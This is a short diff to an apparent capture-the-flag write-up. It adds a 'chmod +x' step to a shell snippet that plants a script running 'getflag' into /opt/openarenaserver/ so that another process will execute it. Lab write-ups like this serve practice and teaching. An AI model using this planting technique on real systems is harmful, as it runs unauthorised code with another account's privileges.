@@ -49,6 +49,7 @@ We create a script in `/opt/openarenaserver/` that will run the `getflag` comman
 ```bash
 echo '#!/bin/sh' > /opt/openarenaserver/flag.sh
 echo "getflag > /tmp/flag" >> /opt/openarenaserver/flag.sh
+chmod +x /opt/openarenaserver/flag.sh
 ```
 
 ### Result
